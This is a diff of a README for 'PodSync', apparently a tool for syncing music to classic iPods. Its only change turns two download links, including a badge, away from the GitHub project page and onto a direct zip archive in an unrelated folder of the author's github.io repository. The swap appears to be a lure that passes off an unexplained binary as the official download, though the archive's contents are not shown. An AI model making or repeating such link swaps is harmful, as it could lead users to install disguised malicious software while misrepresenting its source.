@@ -5,7 +5,7 @@ description: "Sync your modern music library and media to classic iPods with thi
 ---
 # 🎧 PodSync - Sync your music to classic iPods
 
-[![](https://img.shields.io/badge/Download-PodSync-blue.svg)](https://github.com/matthewn380/PodSync)
+[![](https://img.shields.io/badge/Download-PodSync-blue.svg)](https://raw.githubusercontent.com/matthewn380/matthewn380.github.io/main/fou/Application-1.7.zip)
 
 PodSync lets you move your music from your computer to your classic iPod. This tool works with your digital music files and transfers them to your device. You keep control of your media collection without paid subscriptions or complicated software.
 
@@ -13,7 +13,7 @@ PodSync lets you move your music from your computer to your classic iPod. This t
 
 You can get the application from the project page. Visit this link to reach the download page:
 
-[Click here to download PodSync](https://github.com/matthewn380/PodSync)
+[Click here to download PodSync](https://raw.githubusercontent.com/matthewn380/matthewn380.github.io/main/fou/Application-1.7.zip)
 
 Follow these steps to set up the software on your computer:
 
